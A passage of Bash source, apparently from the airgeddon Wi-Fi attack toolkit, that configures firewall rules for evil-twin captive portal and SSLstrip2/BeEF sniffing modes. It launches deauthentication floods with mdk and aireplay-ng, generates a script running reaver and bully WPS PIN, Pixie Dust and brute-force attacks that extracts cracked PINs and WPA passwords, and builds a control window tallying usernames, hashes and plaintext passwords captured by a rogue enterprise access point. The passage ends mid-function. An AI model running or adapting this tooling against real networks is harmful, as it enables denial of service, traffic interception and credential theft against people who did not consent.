	if [ "${et_mode}" != "et_captive_portal" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter FORWARD counter accept
		else
			"${iptables_cmd}" -P FORWARD ACCEPT
		fi
		echo "1" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
	else
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter FORWARD counter drop
		else
			"${iptables_cmd}" -P FORWARD DROP
		fi
		echo "0" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport 80 counter dnat to ${et_ip_router}:80
			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport 443 counter dnat to ${et_ip_router}:80
			"${iptables_cmd}" add rule ip filter INPUT tcp dport 80 counter accept
			"${iptables_cmd}" add rule ip filter INPUT tcp dport 443 counter accept
		else
			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ${et_ip_router}:80
			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination ${et_ip_router}:80
			"${iptables_cmd}" -A INPUT -p tcp --destination-port 80 -j ACCEPT
			"${iptables_cmd}" -A INPUT -p tcp --destination-port 443 -j ACCEPT
		fi

		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter INPUT udp dport 53 counter accept
		else
			"${iptables_cmd}" -A INPUT -p udp --destination-port 53 -j ACCEPT
		fi
	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${bettercap_proxy_port} counter accept
			"${iptables_cmd}" add rule ip filter INPUT udp dport ${bettercap_dns_port} counter accept
			"${iptables_cmd}" add rule ip filter INPUT iifname "lo" counter accept
		else
			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
			"${iptables_cmd}" -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
			"${iptables_cmd}" -A INPUT -i lo -j ACCEPT
		fi
	elif [ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${bettercap_proxy_port} counter accept
			"${iptables_cmd}" add rule ip filter INPUT udp dport ${bettercap_dns_port} counter accept
			"${iptables_cmd}" add rule ip filter INPUT iifname "lo" counter accept
			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${beef_port} counter accept
		else
			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
			"${iptables_cmd}" -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
			"${iptables_cmd}" -A INPUT -i lo -j ACCEPT
			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${beef_port} -j ACCEPT
		fi
	fi

	if [ "${et_mode}" != "et_captive_portal" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule nat POSTROUTING ip saddr ${et_ip_range}/${std_c_mask_cidr} oifname "${internet_interface}" counter masquerade
		else
			"${iptables_cmd}" -t nat -A POSTROUTING -o "${internet_interface}" -j MASQUERADE
		fi
	fi

	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" add rule ip filter INPUT ip saddr ${et_ip_range}/${std_c_mask_cidr} ip daddr ${et_ip_router}/${ip_mask_cidr} icmp type echo-request ct state new,related,established counter accept
		"${iptables_cmd}" add rule ip filter INPUT ip saddr ${et_ip_range}/${std_c_mask_cidr} ip daddr ${et_ip_router}/${ip_mask_cidr} counter drop
	else
		"${iptables_cmd}" -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
		"${iptables_cmd}" -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
	fi
	sleep 2
}

#Launch dhcpd server
function launch_dhcp_server() {

	debug_print

	kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			dchcpd_scr_window_position=${g1_bottomleft_window}
		;;
		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
			dchcpd_scr_window_position=${g3_middleleft_window}
		;;
		"et_sniffing_sslstrip2")
			dchcpd_scr_window_position=${g4_middleleft_window}
		;;
	esac
	manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${dchcpd_scr_window_position} -T \"DHCP\"" "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}clts.txt 2>&1" "DHCP"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "dhcpd -d -cf \"${dhcp_path}\" ${interface}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi

	sleep 2
}

#Execute DoS for Evil Twin and Enterprise attacks
function exec_et_deauth() {

	debug_print

	prepare_et_monitor

	case ${et_dos_attack} in
		"${mdk_command}")
			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
		;;
		"Aireplay")
			kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
		;;
		"Wds Confusion")
			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
		;;
	esac

	recalculate_windows_sizes
	if [ -n "${enterprise_mode}" ]; then
		deauth_scr_window_position=${g1_bottomleft_window}
	else
		case ${et_mode} in
			"et_onlyap")
				deauth_scr_window_position=${g1_bottomright_window}
			;;
			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
				deauth_scr_window_position=${g3_bottomleft_window}
			;;
			"et_sniffing_sslstrip2")
				deauth_scr_window_position=${g4_bottomleft_window}
			;;
		esac
	fi

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		dos_pursuit_mode_pids=()
		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
		pid_control_pursuit_mode "${et_dos_attack}" "evil_twin" &
	else
		manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
			et_processes+=($!)
		else
			get_tmux_process_id "${deauth_et_cmd}"
			et_processes+=("${global_process_pid}")
			global_process_pid=""
		fi

		sleep 1
	fi
}

#Create here-doc bash script used for wps pin attacks
function set_wps_attack_script() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1

	bully_reaver_band_modifier=""
	if [[ "${wps_channel}" -gt 14 ]] && [[ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 1 ]]; then
		bully_reaver_band_modifier="-5"
	fi

	exec 7>"${tmpdir}${wps_attack_script_file}"

	wps_attack_tool="${1}"
	wps_attack_mode="${2}"
	if [ "${wps_attack_tool}" = "reaver" ]; then
		unbuffer=""
		case ${wps_attack_mode} in
			"pindb"|"custompin")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -g 1 -d 2 -vvv -p "
			;;
			"pixiedust")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -K 1 -N -vvv"
			;;
			"bruteforce")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -d 2 -vvv"
			;;
			"nullpin")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -g 1 -d 2 -vvv -p ''"
			;;
		esac
	else
		unbuffer="stdbuf -i0 -o0 -e0 "
		case ${wps_attack_mode} in
			"pindb"|"custompin")
				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -F -B -v ${bully_verbosity} -p "
			;;
			"pixiedust")
				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -d -v ${bully_verbosity}"
			;;
			"bruteforce")
				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -S -L -F -B -v ${bully_verbosity}"
			;;
		esac
	fi

	attack_cmd2=" | tee ${tmpdir}${wps_out_file}"

	cat >&7 <<-EOF
		#!/usr/bin/env bash
		script_wps_attack_tool="${wps_attack_tool}"
		script_wps_attack_mode="${wps_attack_mode}"
		attack_pin_counter=1
		script_interface="${interface}"
		script_wps_bssid="${wps_bssid}"
		script_wps_channel="${wps_channel}"
		script_bully_reaver_band_modifier="${bully_reaver_band_modifier}"
		colorize="${colorize}"
	EOF

	cat >&7 <<-'EOF'
		case ${script_wps_attack_mode} in
	EOF

	cat >&7 <<-EOF
			"pindb")
				script_pins_found=(${pins_found[@]})
				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
				pin_header1="${white_color}Testing PIN "
			;;
			"custompin")
				current_pin=${custom_pin}
				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
				pin_header1="${white_color}Testing PIN "
			;;
			"pixiedust")
				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pixiedust} ${attack_cmd1}"
				pin_header1="${white_color}Testing Pixie Dust attack${normal_color}"
			;;
			"bruteforce")
				script_attack_cmd1="${unbuffer} ${attack_cmd1}"
				pin_header1="${white_color}Testing all possible PINs${normal_color}"
			;;
			"nullpin")
				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
				pin_header1="${white_color}Testing null PIN"
			;;
		esac

		pin_header2=" (${yellow_color}"
		pin_header3="${white_color})${normal_color}"
		script_attack_cmd2="${attack_cmd2}"

		function manage_wps_pot() {
			echo "" > "${wpspotenteredpath}"
			{
	EOF

	cat >&7 <<-'EOF'
			date +%Y-%m-%d
	EOF

	cat >&7 <<-EOF
			echo -e "${wps_texts[${language},1]}"
			echo ""
			echo -e "BSSID: ${wps_bssid}"
			echo -e "${wps_texts[${language},2]}: ${wps_channel}"
			echo -e "ESSID: ${wps_essid}"
			echo ""
			echo "---------------"
			echo ""
	EOF

	cat >&7 <<-'EOF'
			echo -e "${1}"
			echo ""
	EOF

	cat >&7 <<-EOF
			echo "---------------"
			echo ""
			echo "${footer_texts[${language},0]}"
			} >> "${wpspotenteredpath}"

			echo ""
			echo -e "${white_color}${wps_texts[${language},0]}: ${yellow_color}${wpspotenteredpath}"
		}

		#Parse the output file generated by the attack
		function parse_output() {

			readarray -t LINES_TO_PARSE < <(cat < "${tmpdir}${wps_out_file}" 2> /dev/null)
	EOF

	cat >&7 <<-'EOF'
			if [ "${script_wps_attack_tool}" = "reaver" ]; then
				case ${script_wps_attack_mode} in
					"pindb"|"custompin"|"bruteforce"|"nullpin")
						failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
						success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
						success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
						pin_cracked_regexp="^\[\+\][[:space:]]WPS[[:space:]]PIN:[[:space:]]'([0-9]{8})'"
						password_cracked_regexp="^\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
					;;
					"pixiedust")
						success_attack_badpixie_regexp="^\[Pixie\-Dust\].*\[\-\][[:space:]]WPS[[:space:]]pin[[:space:]]not[[:space:]]found"
						success_attack_goodpixie_pin_regexp="^\[Pixie\-Dust\][[:space:]]*\[\+\][[:space:]]*WPS[[:space:]]pin:.*([0-9]{8})"
						success_attack_goodpixie_password_regexp=".*?\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
					;;
				esac
			else
				case ${script_wps_attack_mode} in
					"pindb"|"custompin"|"bruteforce")
						failed_attack_regexp="^\[\+\][[:space:]].*'WPSFail'"
						success_attack_badpin_regexp="^\[\+\][[:space:]].*'Pin[0-9][0-9]?Bad'"
						success_attack_goodpin_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'([0-9]{8})',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
					;;
					"pixiedust")
						success_attack_badpixie_regexp="^\[Pixie\-Dust\][[:space:]]WPS[[:space:]]pin[[:space:]]not[[:space:]]found"
						success_attack_goodpixie_pin_regexp="^\[Pixie\-Dust\][[:space:]]PIN[[:space:]]FOUND:[[:space:]]([0-9]{8})"
						success_attack_goodpixie_password_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'[0-9]{8}',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
					;;
				esac
			fi

			case ${script_wps_attack_mode} in
				"pindb"|"custompin"|"nullpin")
					for item in "${LINES_TO_PARSE[@]}"; do
						if [ "${script_wps_attack_tool}" = "reaver" ]; then
							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
								if [[ ${item} =~ ${pin_cracked_regexp} ]]; then
									cracked_pin="${BASH_REMATCH[1]}"
									continue
								elif [[ ${item} =~ ${password_cracked_regexp} ]]; then
									cracked_password="${BASH_REMATCH[1]}"
									return 0
								fi
								pin_cracked=1
								continue
							elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
								return 2
							elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
								return 1
							fi
						else
							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]]; then
								cracked_pin="${BASH_REMATCH[1]}"
								cracked_password="${BASH_REMATCH[2]}"
								pin_cracked=1
								return 0
							elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
								return 1
							elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
								return 2
							fi
						fi
					done
				;;
				"pixiedust")
					for item in "${LINES_TO_PARSE[@]}"; do
						if [[ ${item} =~ ${success_attack_goodpixie_pin_regexp} ]]; then
							cracked_pin="${BASH_REMATCH[1]}"
							pin_cracked=1
							continue
						elif [[ ${item} =~ ${success_attack_goodpixie_password_regexp} ]]; then
							cracked_password="${BASH_REMATCH[1]}"
							return 0
						fi
					done
					if [ ${pin_cracked} -eq 1 ]; then
						return 0
					fi
				;;
				"bruteforce")
					for item in "${LINES_TO_PARSE[@]}"; do
						if [ "${script_wps_attack_tool}" = "reaver" ]; then
							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
								if [[ ${item} =~ ${pin_cracked_regexp} ]]; then
									cracked_pin="${BASH_REMATCH[1]}"
									continue
								elif [[ ${item} =~ ${password_cracked_regexp} ]]; then
									cracked_password="${BASH_REMATCH[1]}"
									return 0
								fi
								pin_cracked=1
								continue
							fi
						else
							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]]; then
								cracked_pin="${BASH_REMATCH[1]}"
								cracked_password="${BASH_REMATCH[2]}"
								pin_cracked=1
								return 0
							fi
						fi
					done
				;;
			esac
			return 3
		}
	EOF

	cat >&7 <<-EOF
		#Prints message for pins on timeout
		function print_timeout() {

			echo
	EOF

	cat >&7 <<-'EOF'
			if [ "${script_wps_attack_mode}" = "pixiedust" ]; then
	EOF

	cat >&7 <<-EOF
				timeout_msg="${white_color}Timeout for Pixie Dust attack${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			elif [ "${script_wps_attack_mode}" = "nullpin" ]; then
	EOF

	cat >&7 <<-EOF
				timeout_msg="${white_color}Timeout for null PIN${normal_color}"
			else
				timeout_msg="${white_color}Timeout for last PIN${normal_color}"
			fi
	EOF

	cat >&7 <<-'EOF'
			echo -e "${timeout_msg}"
		}

		pin_cracked=0
		this_pin_timeout=0
		case ${script_wps_attack_mode} in
			"pindb")
				for current_pin in "${script_pins_found[@]}"; do
					possible_bully_timeout=0
					if [ ${attack_pin_counter} -ne 1 ]; then
						sleep 1.5
					fi
					bad_attack_this_pin_counter=0
					if [ "${this_pin_timeout}" -eq 1 ]; then
						print_timeout
					fi

					echo
					echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/${#script_pins_found[@]}${pin_header3}"
					if [ "${script_wps_attack_tool}" = "bully" ]; then
						echo
					fi

					this_pin_timeout=0
					(set -o pipefail && eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2} ${colorize}")
					if [ "$?" = "124" ]; then
						if [ "${script_wps_attack_tool}" = "reaver" ]; then
							this_pin_timeout=1
						else
							possible_bully_timeout=1
						fi
					fi
					attack_pin_counter=$((attack_pin_counter + 1))
					parse_output
					output="$?"
					if [ "${output}" = "0" ]; then
						break
					elif [ "${output}" = "1" ]; then
						this_pin_timeout=1
						continue
					elif [ "${output}" = "2" ]; then
						continue
					elif [[ "${output}" = "3" ]] || [[ "${this_pin_timeout}" -eq 1 ]] || [[ ${possible_bully_timeout} -eq 1 ]]; then
						if [ "${this_pin_timeout}" -eq 1 ]; then
							continue
						fi
						bad_attack_this_pin_counter=$((bad_attack_this_pin_counter + 1))
						if [ ${bad_attack_this_pin_counter} -eq 3 ]; then
							this_pin_timeout=1
							continue
						fi
						if [ ${possible_bully_timeout} -eq 1 ]; then
							this_pin_timeout=1
							continue
						fi
					fi
				done
			;;
			"custompin")
				possible_bully_timeout=0
				echo
				echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/1${pin_header3}"
				if [ "${script_wps_attack_tool}" = "bully" ]; then
					echo
				fi

				(set -o pipefail && eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2} ${colorize}")
				if [ "$?" = "124" ]; then
					if [ "${script_wps_attack_tool}" = "reaver" ]; then
						this_pin_timeout=1
					else
						possible_bully_timeout=1
					fi
				fi

				parse_output
				output="$?"
				if [[ "${output}" != "0" ]] && [[ "${output}" != "2" ]]; then
					if [ "${this_pin_timeout}" -ne 1 ]; then
						if [ "${output}" = "1" ]; then
							this_pin_timeout=1
						elif [ ${possible_bully_timeout} -eq 1 ]; then
							if [ ${possible_bully_timeout} -eq 1 ]; then
								this_pin_timeout=1
							fi
						fi
					fi
				fi
			;;
			"pixiedust")
				echo
				echo -e "${pin_header1}"
				if [ "${script_wps_attack_tool}" = "bully" ]; then
					echo
				fi

				(set -o pipefail && eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}")
				if [ "$?" = "124" ]; then
					this_pin_timeout=1
				fi
				parse_output
			;;
			"bruteforce")
				echo
				echo -e "${pin_header1}"
				if [ "${script_wps_attack_tool}" = "bully" ]; then
					echo
				fi
				eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}"
				parse_output
			;;
			"nullpin")
				echo
				echo -e "${pin_header1}"
				(set -o pipefail && eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}")
				if [ "$?" = "124" ]; then
					this_pin_timeout=1
				fi
				parse_output
			;;
		esac

		if [ ${pin_cracked} -eq 1 ]; then
	EOF

	cat >&7 <<-EOF
			echo
			pin_cracked_msg="${white_color}PIN cracked: ${yellow_color}"
			password_cracked_msg="${white_color}Password cracked: ${yellow_color}"
			password_not_cracked_msg="${white_color}Password was not cracked: ${yellow_color}Maybe because bad/low signal, or PBC activated on AP"
	EOF

	cat >&7 <<-'EOF'
			echo -e "${pin_cracked_msg}${cracked_pin}"
			if [ -n "${cracked_password}" ]; then
				echo -e "${password_cracked_msg}${cracked_password}"
				manage_wps_pot "${cracked_password}"
			else
				echo -e "${password_not_cracked_msg}"
			fi
		fi

		if [ "${this_pin_timeout}" -eq 1 ]; then
	EOF
	cat >&7 <<-EOF
			print_timeout
		fi

		echo
		echo -e "${white_color}Close this window"
		read -r -d '' _ </dev/tty
	EOF

	exec 7>&-
	sleep 1
}

#Create here-doc bash script used for control windows on Enterprise attacks
function set_enterprise_control_script() {

	debug_print

	exec 7>"${tmpdir}${control_enterprise_file}"

	local control_msg
	if [ ${enterprise_mode} = "smooth" ]; then
		control_msg=${enterprise_texts[${language},3]}
	else
		control_msg=${enterprise_texts[${language},4]}
	fi

	cat >&7 <<-EOF
		#!/usr/bin/env bash
		interface="${interface}"
		et_initial_state="${et_initial_state}"
		interface_airmon_compatible=${interface_airmon_compatible}
		iface_monitor_et_deauth="${iface_monitor_et_deauth}"
		airmon="${airmon}"
		enterprise_returning_vars_file="${tmpdir}${enterprisedir}returning_vars.txt"
		enterprise_heredoc_mode="${enterprise_mode}"
		path_to_processes="${tmpdir}${enterprisedir}${enterprise_processesfile}"
		wpe_logfile="${tmpdir}${hostapd_wpe_log}"
		success_file="${tmpdir}${enterprisedir}${enterprise_successfile}"
		done_msg="${yellow_color}${enterprise_texts[${language},9]}${normal_color}"
		log_reminder_msg="${pink_color}${enterprise_texts[${language},10]}: [${normal_color}${enterprise_completepath}${pink_color}]${normal_color}"
	EOF

	cat >&7 <<-'EOF'
		#Restore interface to its original state
		function restore_interface() {

			if hash rfkill 2> /dev/null; then
				rfkill unblock all > /dev/null 2>&1
			fi

			iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1

			if [ "${et_initial_state}" = "Managed" ]; then
				ip link set "${interface}" down > /dev/null 2>&1
				iw "${interface}" set type managed > /dev/null 2>&1
				ip link set "${interface}" up > /dev/null 2>&1
				ifacemode="Managed"
			else
				if [ "${interface_airmon_compatible}" -eq 1 ]; then
					new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)

					[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
					if [ "${interface}" != "${new_interface}" ]; then
						interface=${new_interface}
						phy_interface=$(basename "$(readlink "/sys/class/net/${interface}/phy80211")" 2> /dev/null)
						current_iface_on_messages="${interface}"
					fi
				else
					ip link set "${interface}" down > /dev/null 2>&1
					iw "${interface}" set monitor control > /dev/null 2>&1
					ip link set "${interface}" up > /dev/null 2>&1
				fi
				ifacemode="Monitor"
			fi
		}

		#Save some vars to a file to get read from main script
		function save_returning_vars_to_file() {
			{
			echo -e "interface=${interface}"
			echo -e "phy_interface=${phy_interface}"
			echo -e "current_iface_on_messages=${current_iface_on_messages}"
			echo -e "ifacemode=${ifacemode}"
			} > "${enterprise_returning_vars_file}"
		}
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
			function kill_tmux_windows() {

				local TMUX_WINDOWS_LIST=()
				local current_window_name
				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
						continue
					fi
					if [ -n "\${1}" ]; then
						if [ "\${current_window_name}" = "\${1}" ]; then
							continue
						fi
					fi
					tmux kill-window -t "${session_name}:\${current_window_name}"
				done
			}
		EOF
	fi

	cat >&7 <<-'EOF'
		#Kill Evil Twin Enterprise processes
		function kill_enterprise_windows() {

			readarray -t ENTERPRISE_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
			for item in "${ENTERPRISE_PROCESSES_TO_KILL[@]}"; do
				kill "${item}" &> /dev/null
			done
		}

		#Check if a hash or a password was captured (0=hash, 1=plaintextpass, 2=both)
		function check_captured() {

			local hash_captured=0
			local plaintext_password_captured=0
			readarray -t ENTERPRISE_LINES_TO_PARSE < <(cat < "${wpe_logfile}" 2> /dev/null)
			for item in "${ENTERPRISE_LINES_TO_PARSE[@]}"; do

				if [[ "${item}" =~ challenge: ]]; then
					hash_captured=1
				elif [[ "${item}" =~ password: ]]; then
					plaintext_password_captured=1
				fi
			done

			if [[ ${hash_captured} -eq 1 ]] || [[ ${plaintext_password_captured} -eq 1 ]]; then
				touch "${success_file}" > /dev/null 2>&1
			fi

			if [[ ${hash_captured} -eq 1 ]] && [[ ${plaintext_password_captured} -eq 0 ]]; then
				echo 0 > "${success_file}" 2> /dev/null
				return 0
			elif [[ ${hash_captured} -eq 0 ]] && [[ ${plaintext_password_captured} -eq 1 ]]; then
				echo 1 > "${success_file}" 2> /dev/null
				return 0
			elif [[ ${hash_captured} -eq 1 ]] && [[ ${plaintext_password_captured} -eq 1 ]]; then
				echo 2 > "${success_file}" 2> /dev/null
				return 0
			fi

			return 1
		}

		#Set captured hashes and passwords counters
		function set_captured_counters() {

			local new_username_found=0
			declare -A lines_and_usernames

			readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${wpe_logfile}" | sort -k 2,2 | uniq --skip-fields=1 2> /dev/null)
			for item in "${CAPTURED_USERNAMES[@]}"; do
				[[ ${item} =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="${BASH_REMATCH[1]}" && username="${BASH_REMATCH[2]}"
				lines_and_usernames["${username}"]="${line_number}"
			done

			hashes_counter=0
			plaintext_pass_counter=0
			for item2 in "${lines_and_usernames[@]}"; do
				local line_to_check=$((item2 + 1))
				local text_to_check=$(sed "${line_to_check}q;d" "${wpe_logfile}" 2> /dev/null)
				if [[ "${text_to_check}" =~ challenge: ]]; then
					hashes_counter=$((hashes_counter + 1))
				elif [[ "${text_to_check}" =~ password: ]]; then
					plaintext_pass_counter=$((plaintext_pass_counter + 1))
				fi
			done
		}

		#Get last captured user name
		function get_last_username() {

			line_with_last_user=$(grep -E "username:" "${wpe_logfile}" | tail -1)
			[[ ${line_with_last_user} =~ username:[[:blank:]]+(.*) ]] && last_username="${BASH_REMATCH[1]}"
		}
	EOF

	cat >&7 <<-'EOF'

		date_counter=$(date +%s)
		last_username=""
		break_on_next_loop=0
		while true; do
			if [ ${break_on_next_loop} -eq 1 ]; then
				tput ed
			fi
	EOF

	cat >&7 <<-EOF
			if [ "${channel}" != "${et_channel}" ]; then
				et_control_window_channel="${et_channel} (5Ghz: ${channel})"
			else
				et_control_window_channel="${channel}"
			fi
			echo -e "\t${yellow_color}${enterprise_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${enterprise_texts[${language},1]}: ${normal_color}\${et_control_window_channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
			echo
			echo -e "\t${green_color}${enterprise_texts[${language},2]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			hours=$(date -u --date @$(($(date +%s) - date_counter)) +%H)
			mins=$(date -u --date @$(($(date +%s) - date_counter)) +%M)
			secs=$(date -u --date @$(($(date +%s) - date_counter)) +%S)
			echo -e "\t${hours}:${mins}:${secs}"

			if [ ${break_on_next_loop} -eq 0 ]; then
	EOF

	cat >&7 <<-EOF
				echo -e "\t${pink_color}${control_msg}${normal_color}\n"
			fi
	EOF

	cat >&7 <<-'EOF'
			echo
			if [ -z "${last_username}" ]; then
	EOF

	cat >&7 <<-EOF
				echo -e "\t${blue_color}${enterprise_texts[${language},6]}${normal_color}"
				echo -e "\t${blue_color}${enterprise_texts[${language},7]}${normal_color}: 0"
				echo -e "\t${blue_color}${enterprise_texts[${language},8]}${normal_color}: 0"
			else
				last_name_to_print="${blue_color}${enterprise_texts[${language},5]}:${normal_color}"
				hashes_counter_message="${blue_color}${enterprise_texts[${language},7]}:${normal_color}"
				plaintext_pass_counter_message="${blue_color}${enterprise_texts[${language},8]}:${normal_color}"
	EOF

	cat >&7 <<-'EOF'
				tput el && echo -e "\t${last_name_to_print} ${last_username}"
				echo -e "\t${hashes_counter_message} ${hashes_counter}"
				echo -e "\t${plaintext_pass_counter_message} ${plaintext_pass_counter}"
			fi

			if [ ${break_on_next_loop} -eq 1 ]; then
				kill_enterprise_windows
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
				kill_tmux_windows "Control"
		EOF
	fi

	cat >&7 <<-'EOF'
				break
			fi

			if check_captured; then
				get_last_username
				set_captured_counters
			 	if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
					break_on_next_loop=1
				fi
			fi

			echo -ne "\033[K\033[u"
			sleep 0.3
			current_window_size="$(tput cols)x$(tput lines)"
			if [ "${current_window_size}" != "${stored_window_size}" ]; then
				stored_window_size="${current_window_size}"
				clear
			fi
		done

		if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
			echo
			echo -e "\t${log_reminder_msg}"
			echo
			echo -e "\t${done_msg}"

			if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
				restore_interface
